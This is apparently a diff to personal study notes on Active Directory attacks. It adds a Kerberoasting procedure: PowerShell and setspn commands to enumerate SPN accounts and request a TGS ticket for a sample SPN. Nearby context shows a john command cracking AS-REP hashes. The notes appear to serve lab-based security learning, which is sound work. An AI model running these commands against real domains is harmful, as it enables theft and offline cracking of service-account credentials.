@@ -59,7 +59,7 @@ Trust  - Trust provides a mechanism for users to access resources in another dom
 *** All domains in a forest trust all other domains in the forest ***
     Trust can extend outside the forest
 _______________________________________________________________________________________________________________________________________________________________________________________________
-Kerberoasting: Kerberoasting is a Kerberos attack that targets service accounts to obtain their encrypted service account passwords (SPNs), which can be cracked offline to obtain plaintext passwords.
+Kerberoasting: Kerberoasting is a Kerberos attack that targets user accounts with Service Principal Name (SPN) enabled.
 
 AS-REP Roasting: AS-REP roasting is a Kerberos authentication attack that targets user accounts with the "Do not require Kerberos preauthentication" enabled.
 
@@ -84,6 +84,40 @@ Which part of the Kerberos authentication process does AS-REP roasting target? >
 
 4. Crack with john in windows
    C:> .\john.exe .\johnnyhash.txt --format=krb5asrep --wordlist=10k-worst-pass.txt
+_______________________________________________________________________________________________________________________________________________________________________________________________
+Kerberoasting
+-------------
+1. Identify user accounts with SPN enabled
+   C:>  get-netuser | where-object {$_.servicePrincipalName} | fl
+
+   The setspn command in Windows is used to manage Service Principal Names (SPNs) for an Active Directory (AD) service account. 
+   SPNs are unique identifiers for services running on servers. They are used by Kerberos authentication to associate a service instance with a service logon account.
+
+   C:> setspn -T research -Q */*
+
+   research is a domain name
+   -Q */*: This option queries for SPNs. The asterisks */* act as wildcards, meaning the query will look for all SPNs in the specified domain or forest.
+
+   C:> klist
+
+2. Request a TGS ticket for the specified SPN using Kerberos.
+
+   C:>Add-Type -AssemblyName system.identityModel 
+
+   The Add-Type cmdlet in PowerShell is used to add .NET Framework types to a PowerShell session. This allows you to use .NET classes and methods directly within PowerShell scripts.
+
+   Add-Type: The cmdlet used to add .NET types.
+   AssemblyName: Specifies the name of the assembly containing the types you want to add.
+   System.IdentityModel: The name of the assembly to add. This particular assembly is part of the .NET Framework and provides classes for identity management, security tokens, and claims-based authentication.
+   
+   C:> New-object System.identityModel.Tokens.KerberosRequestorSecurityToken -Argumentlist "ops/research.SECURITY.local:1434"
+
+   "ops/research.SECURITY.local:1434" = SPN
+
+
+
+3. Crack the password from the TGS ticket using Tgsrepcrack 
+
 
 
 
